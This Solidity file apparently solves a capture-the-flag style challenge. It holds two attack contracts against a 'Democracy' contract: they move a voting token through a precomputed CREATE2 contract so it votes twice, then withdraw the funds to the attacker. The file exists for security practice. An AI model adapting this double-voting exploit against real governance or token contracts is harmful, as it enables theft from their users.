// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import {Democracy} from "../Democracy.sol";

contract DemocracyAttack1 {
    event Log(address);

    address public democracyAttack2_;
    address public democracyAttack2__;
    bytes public data;

    constructor(Democracy _victim, bytes32 _salt) {
        //   emit Log(address(this));

        _victim.nominateChallenger(address(this));

        bytes memory creationCode = type(DemocracyAttack2).creationCode;
        bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(_victim));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        data = bytecode;
        address democracyAttack2 = address(uint160(uint256(hash)));

        democracyAttack2_ = democracyAttack2;

        assert(_victim.ownerOf(0) == address(this));
        assert(_victim.ownerOf(1) == address(this));
        assert(_victim.challenger() == address(this));
        assert(democracyAttack2 != address(0));

        _victim.transferFrom(address(this), democracyAttack2, 0);

        DemocracyAttack2 _democracyAttack2 = new DemocracyAttack2{salt: _salt}(_victim);
        democracyAttack2__ = address(_democracyAttack2);

        assert(democracyAttack2 == address(_democracyAttack2));

        _victim.vote(address(this));

        _victim.withdrawToAddress(msg.sender);
    }
}

contract DemocracyAttack2 {
    constructor(Democracy _victim) {
        assert(_victim.ownerOf(0) == address(this));

        _victim.vote(msg.sender);
        _victim.transferFrom(address(this), msg.sender, 0);

        assert(_victim.ownerOf(0) == msg.sender);
    }
}
